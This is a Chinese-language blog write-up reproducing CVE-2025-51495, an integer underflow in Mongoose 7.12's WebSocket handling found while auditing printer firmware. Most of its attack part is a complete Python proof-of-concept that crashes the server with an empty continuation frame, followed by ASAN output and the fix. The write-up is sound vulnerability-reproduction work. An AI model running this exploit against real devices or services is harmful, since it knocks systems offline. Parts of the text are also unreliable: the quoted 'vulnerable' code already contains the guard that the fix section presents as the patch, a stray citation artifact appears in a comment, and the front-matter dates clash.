---
title: 'Mongoose CVE-2025-51495 复现'
alt: 'Az'
image: ''
summary: ''
created: 2025-12-04
updated: 2024-12-31
tags:
  - 'IoT'
  - 'Rev'
---

## 背景

针对某信创打印机固件进行漏洞挖掘时，确认其使用 mongoose 7.12 版本，故先尝试复现一下该版本的已知漏洞 [CVE-2025-51495](https://github.com/cainiao159357/CVE-2025-51495) 。

## 挑战

需要自行构建一个可测试环境，且原仓库没有给出可直接使用的 POC，需要自行构建。

## 解决过程

### 测试环境

使用 7.12 版本的 mongoose，git clone 拉取仓库并 git checkout 到 7.12 ,使用 `mongoose/examples/websocket-server` 官方示例

```bash
total 464
-rw-r--r--@ 1 az  staff   1.2K Dec  2 16:13 Makefile
-rw-r--r--@ 1 az  staff    73B Dec  2 16:13 README.md
-rwxr-xr-x@ 1 az  staff   216K Dec  4 11:38 example
drwxr-xr-x@ 3 az  staff    96B Dec  4 11:38 example.dSYM
-rw-r--r--@ 1 az  staff   1.8K Dec  2 16:13 main.c
lrwxr-xr-x@ 1 az  staff    16B Dec  2 16:13 mongoose.c -> ../../mongoose.c
lrwxr-xr-x@ 1 az  staff    16B Dec  2 16:13 mongoose.h -> ../../mongoose.h
-rw-r--r--@ 1 az  staff   1.5K Dec  2 16:13 test.html
```

修改 Makefile 配置，增加 ASAN 便于后续 POC 测试

```Makefile
# Debug and sanitizer options
CFLAGS_DEBUG = -O0 -g3 -ggdb -fno-omit-frame-pointer
CFLAGS_ASAN = -fsanitize=address -fsanitize=undefined -fno-sanitize-recover=all
CFLAGS_EXTRA_DEBUG = -DDEBUG -DMG_ENABLE_LOG=1

# 同时别忘了把新加的 FLAGS 添加到 build 的$(PROG)里
```

编译运行：

```bash
make clean && make
rm -rf                    example                    *.o *.obj *.exe *.dSYM
cc main.c mongoose.c        -W -Wall -Wextra -g -I.   -O0 -g3 -ggdb -fno-omit-frame-pointer -fsanitize=address -fsanitize=undefined -fno-sanitize-recover=all -DDEBUG -DMG_ENABLE_LOG=1 -DMG_ENABLE_LINES  -o example
./example
example(25769,0x20361b240) malloc: nano zone abandoned due to inability to reserve vm space.
Starting WS listener on ws://localhost:8000/websocket
```

这样就可以进行后续的测试

### 漏洞利用

漏洞发生在 mg_ws_cb 函数中，该函数是 Mongoose WebSocket 数据处理的核心回调。关键代码片段如下：

```c
static void mg_ws_cb(struct mg_connection *c, int ev, void *ev_data) {
    struct ws_msg msg;
    size_t ofs = (size_t) c->pfn_data;  // 当前接收缓冲区偏移:contentReference[oaicite:11]
    if (ev == MG_EV_READ) {
        // … 执行 WebSocket 握手等处理 …
        while (ws_process(c->recv.buf + ofs, c->recv.len - ofs, &msg) > 0) {
            // 解析到一个 WebSocket 帧，msg.header_len/msg.data_len/msg.flags 可用
            uint8_t final = msg.flags & 128, op = msg.flags & 15;
            // 处理非分片帧：如果final&&op非0，会调用事件处理并删除缓冲区数据
            if (final && op) {
                // [正常非续帧结束后的清理：删除已处理数据]
                mg_iobuf_del(&c->recv, ofs, msg.header_len + msg.data_len);
                ofs = 0; c->pfn_data = NULL;
            }
            // 处理分片帧：续帧（opcode=0）
            if (final == 0 || op == 0) {
                if (op) {
                    // 第一个片段（带有opcode）: 剥离报头并更新 ofs
                    ofs++;
                    msg.header_len--;
                    mg_iobuf_del(&c->recv, ofs, msg.header_len);
                    msg.data_len += msg.header_len;
                    ofs += msg.data_len;  //<-- 关键：ofs 会增加 payload 长度！
                    c->pfn_data = (void *) ofs;
                }
                // 最后一个分片：如果 FIN=1 且 opcode=0，说明这是续帧的最后一片
                if (final && !op && ofs > 0) {
                    // 构造完整消息，将 buf[1..ofs-1] 作为内容
                    m.flags = c->recv.buf[0];
                    m.data = mg_str_n((char *)&c->recv.buf[1], (size_t)(ofs - 1)); // <-- 下溢点
                    mg_call(c, MG_EV_WS_MSG, &m);  // 触发 WS 消息事件
                    mg_iobuf_del(&c->recv, 0, ofs); // 清空缓冲区
                    ofs = 0; c->pfn_data = NULL;
                }
            }
        }
    }
}
```

其中，ofs = (size_t)c->pfn_data 表示当前缓冲区中已处理的数据长度。在最后一个分片帧处理中（if (final && !op)），代码将缓冲区 c->recv.buf[1..ofs-1] 合并成一个 mg_str 对象，并触发MG_EV_WS_MSG 事件。  

代码中使用 (size_t) (ofs - 1) 作为长度参数。如果 ofs 为 0，则：
- ofs - 1 = -1
- 转换为 size_t 后变成 0xFFFFFFFFFFFFFFFF（64位系统）或 0xFFFFFFFF（32位系统）:整数下溢（整数溢出）
- 导致 mg_str_n 尝试读取巨大的内存范围，造成越界读取  

据此，可以写出测试使用的完整 POC,需要注意两点
1. 不需要先发送分片帧，直接发送一个 `FIN=1, opcode=0`（续帧结束帧）
2. **payload 必须为空** 原因如下：

```txt
   当发送 `FIN=1, opcode=0` 的帧时：
   - 进入 `if (final == 0 || op == 0)` 分支（因为 op==0）
   - 跳过 `if (op)` 分支（因为 op==0）
   - 执行 `ofs += len`，其中 `len = payload_length`
   - **如果 payload 不为空，ofs 会变成 payload 的长度，不会触发下溢**
   - **只有 payload 为空时，ofs 才保持为 0**
```

完整 POC 如下：

```python
#!/usr/bin/env python3
"""
CVE-2025-51495 PoC - Mongoose WebSocket Integer Underflow
Affected versions: Mongoose 7.5 - 7.17

VULNERABILITY ANALYSIS:
The bug is in mg_ws_cb() when processing WebSocket fragmented frames.
When a continuation frame (FIN=1, opcode=0) with EMPTY payload is received
WITHOUT any prior fragment, ofs remains 0, causing integer underflow:

Code path:
1. WebSocket handshake completes: ofs=0, c->pfn_data=NULL
2. Receive frame: FIN=1, opcode=0, payload="" (empty)
3. Enter: if (final == 0 || op == 0) -> TRUE (op==0)
4. Skip: if (op) -> FALSE (op==0)
5. Execute: mg_iobuf_del(&c->recv, 0, header_len) - strips header
6. Execute: ofs += 0 (payload length is 0) -> ofs stays 0
7. Enter: if (final && !op) -> TRUE
8. Execute: mg_str_n(..., (size_t)(ofs - 1))
9. INTEGER UNDERFLOW: (size_t)(0 - 1) = 0xFFFFFFFFFFFFFFFF
10. CRASH: When trying to use this huge length value

KEY INSIGHT: The payload MUST be empty! If payload has data, ofs will be
updated to the payload length, preventing the underflow.
"""

import socket
import struct
import sys
import time

# Configuration
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8000
WS_ENDPOINT = "/websocket"

def create_websocket_handshake(host, port, path):
    """Create HTTP WebSocket upgrade request"""
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    )
    return request.encode()

def create_ws_frame(payload, opcode=1, fin=True, mask=True):
    """
    Create a WebSocket frame according to RFC 6455
    
    Args:
        payload: bytes - frame payload data
        opcode: int - 0=continuation, 1=text, 2=binary, 8=close, 9=ping, 10=pong
        fin: bool - FIN bit (True=final fragment, False=more fragments)
        mask: bool - whether to mask payload (client->server MUST mask)
    
    Returns:
        bytes - complete WebSocket frame
    """
    frame = bytearray()
    
    # Byte 0: FIN (1 bit) + RSV1-3 (3 bits) + Opcode (4 bits)
    byte0 = opcode & 0x0F
    if fin:
        byte0 |= 0x80  # Set FIN bit
    frame.append(byte0)
    
    # Byte 1+: MASK bit + Payload length
    payload_len = len(payload)
    byte1 = 0x80 if mask else 0x00  # MASK bit
    
    if payload_len < 126:
        byte1 |= payload_len
        frame.append(byte1)
    elif payload_len < 65536:
        byte1 |= 126
        frame.append(byte1)
        frame.extend(struct.pack('>H', payload_len))
    else:
        byte1 |= 127
        frame.append(byte1)
        frame.extend(struct.pack('>Q', payload_len))
    
    # Masking key (4 bytes) if masked
    if mask:
        mask_key = b'\x00\x00\x00\x00'  # Simple mask for PoC
        frame.extend(mask_key)
        
        # Apply mask to payload
        masked_payload = bytearray(payload)
        for i in range(len(masked_payload)):
            masked_payload[i] ^= mask_key[i % 4]
        frame.extend(masked_payload)
    else:
        frame.extend(payload)
    
    return bytes(frame)

def check_server_alive(host, port, timeout=2):
    """Check if server is accepting connections"""
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(timeout)
        test_sock.connect((host, port))
        test_sock.close()
        return True
    except:
        return False

def exploit_cve_2025_51495(host, port, path):
    """
    Exploit CVE-2025-51495 integer underflow vulnerability
    
    Sends a continuation frame (FIN=1, opcode=0) with empty payload
    WITHOUT any prior fragment, causing ofs=0 and triggering underflow.
    """
    
    print("=" * 70)
    print("CVE-2025-51495 PoC - Mongoose WebSocket Integer Underflow")
    print(f"Target: {host}:{port}{path}")
    print("Affected: Mongoose 7.5 - 7.17")
    print("=" * 70)
    print()
    
    # Step 1: Verify server is alive
    print("[1] Checking if target server is alive...")
    if not check_server_alive(host, port):
        print("[-] Server is not responding")
        print("[-] Please verify target configuration")
        return False
    print("[+] Server is alive and accepting connections")
    print()
    
    # Step 2: Establish baseline connection
    print("[2] Establishing baseline WebSocket connection...")
    try:
        baseline_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        baseline_sock.settimeout(3)
        baseline_sock.connect((host, port))
        
        handshake = create_websocket_handshake(host, port, path)
        baseline_sock.sendall(handshake)
        
        response = baseline_sock.recv(4096)
        if b"101" not in response and b"Switching Protocols" not in response:
            print("[-] WebSocket handshake failed")
            print(f"[-] Response: {response[:200]}")
            baseline_sock.close()
            return False
        
        print("[+] WebSocket handshake successful")
        print("[+] Server is processing WebSocket frames normally")
        baseline_sock.close()
        print()
        
    except Exception as e:
        print(f"[-] Baseline connection failed: {e}")
        return False
    
    # Step 3: Send exploit payload
    print("[3] Sending exploit payload...")
    print()
    
    try:
        exploit_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        exploit_sock.settimeout(5)
        exploit_sock.connect((host, port))
        
        # Perform handshake
        handshake = create_websocket_handshake(host, port, path)
        exploit_sock.sendall(handshake)
        
        response = exploit_sock.recv(4096)
        if b"101" not in response:
            print("[-] Exploit handshake failed")
            exploit_sock.close()
            return False
        
        print("[+] Exploit WebSocket connection established")
        print("[+] Current state: ofs=0, c->pfn_data=NULL")
        print()
        time.sleep(0.3)
        
        # === THE EXPLOIT ===
        # Send a continuation frame (opcode=0) with FIN=1 and EMPTY payload
        # This is the KEY: NO prior fragment, and payload MUST be empty!
        
        print("[!] SENDING MALICIOUS FRAME:")
        print("[!] Type: Continuation frame (opcode=0)")
        print("[!] FIN: 1 (final fragment)")
        print("[!] Payload: EMPTY (length=0)")
        print("[!] This violates WebSocket protocol - continuation without fragment")
        print()
        
        malicious_frame = create_ws_frame(
            payload=b"",  # CRITICAL: Must be empty to keep ofs=0!
            opcode=0,     # Continuation frame
            fin=True,     # Final fragment
            mask=True     # Client frames must be masked
        )
        
        print(f"[>] Frame bytes: {malicious_frame.hex()}")
        print(f"[>] Frame breakdown:")
        print(f"    Byte 0: 0x{malicious_frame[0]:02x} (FIN=1, RSV=0, opcode=0)")
        print(f"    Byte 1: 0x{malicious_frame[1]:02x} (MASK=1, length=0)")
        print(f"    Bytes 2-5: Masking key")
        
        exploit_sock.sendall(malicious_frame)
        print("[+] Malicious frame sent!")
        print()
        
        # Wait for server reaction
        time.sleep(1)
        
        # Try to receive response
        try:
            resp = exploit_sock.recv(1024)
            if resp:
                print(f"[*] Server responded with {len(resp)} bytes")
                print("[-] Server did not crash immediately")
        except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError) as e:
            print(f"[+] Connection error: {type(e).__name__}")
            print("[+] Server likely crashed!")
        
        exploit_sock.close()
        
    except Exception as e:
        print(f"[!] Exception during exploit: {e}")
    
    # Step 4: Verify server crash
    print()
    print("[4] Verifying server crash...")
    time.sleep(2)
    
    crashed = False
    for attempt in range(3):
        print(f"[*] Verification attempt {attempt + 1}/3...")
        if check_server_alive(host, port, timeout=2):
            print(f"[-] Server still alive (attempt {attempt + 1}/3)")
            if attempt == 2:
                print()
                print("[-] EXPLOIT FAILED: Server is still responsive")
                return False
            time.sleep(1)
        else:
            print(f"[+] Server not responding (attempt {attempt + 1}/3)")
            if attempt >= 1:  # Confirm with at least 2 failed attempts
                crashed = True
                break
            time.sleep(1)
    
    print()
    print("=" * 70)
    if crashed:
        print("[+] EXPLOIT SUCCESSFUL!")
    else:
        print("[-] EXPLOIT UNSUCCESSFUL")
    print("=" * 70)
    
    return crashed

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else TARGET_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else TARGET_PORT
    path = sys.argv[3] if len(sys.argv) > 3 else WS_ENDPOINT
    
    try:
        result = exploit_cve_2025_51495(host, port, path)
        sys.exit(0 if result else 1)
        
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
```

## 结果
运行 POC 即可触发 ASAN：
```bash
=================================================================
==91416==ERROR: AddressSanitizer: negative-size-param: (size=-1)
    #0 0x102f56050 in __asan_memmove+0x10c (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x52050)
    #1 0x1029e3a74 in mg_iobuf_add iobuf.c:51
    #2 0x1029cc10c in mg_send sock.c:148
    #3 0x102a7ecb8 in mg_ws_send ws.c:139
    #4 0x1029a3a7c in fn main.c:35
    #5 0x1029aeae4 in mg_call event.c:11
    #6 0x102a825c0 in mg_ws_cb ws.c:227
    #7 0x1029aed8c in mg_call event.c:12
    #8 0x102a6eee0 in iolog sock.c:112
    #9 0x102a75610 in read_conn sock.c:277
    #10 0x1029de6a8 in mg_mgr_poll sock.c:595
    #11 0x1029a35a8 in main main.c:45
    #12 0x183cac270  (<unknown module>)

0x61d000003281 is located 1 bytes inside of 2048-byte region [0x61d000003280,0x61d000003a80)
allocated by thread T0 here:
    #0 0x102f58fd0 in calloc+0x9c (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x54fd0)
    #1 0x1029c0e10 in mg_iobuf_resize iobuf.c:22
    #2 0x102a74840 in read_conn sock.c:268
    #3 0x1029de6a8 in mg_mgr_poll sock.c:595
    #4 0x1029a35a8 in main main.c:45
    #5 0x183cac270  (<unknown module>)

SUMMARY: AddressSanitizer: negative-size-param (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x52050) in __asan_memmove+0x10c
==91416==ABORTING
make: *** [all] Abort trap: 6
```

## 修复方式

在 `if (final && !op)` 分支前添加检查：

```c
if (final && !op && ofs > 0) {  // 添加 ofs > 0 检查
    m.flags = c->recv.buf[0];
    m.data = mg_str_n((char *) &c->recv.buf[1], (size_t) (ofs - 1));
    mg_call(c, MG_EV_WS_MSG, &m);
    mg_iobuf_del(&c->recv, 0, ofs);
    ofs = 0;
    c->pfn_data = NULL;
}
```

这也是 [Mongoose PR #3131](https://github.com/cesanta/mongoose/pull/3131) 中的修复方法。
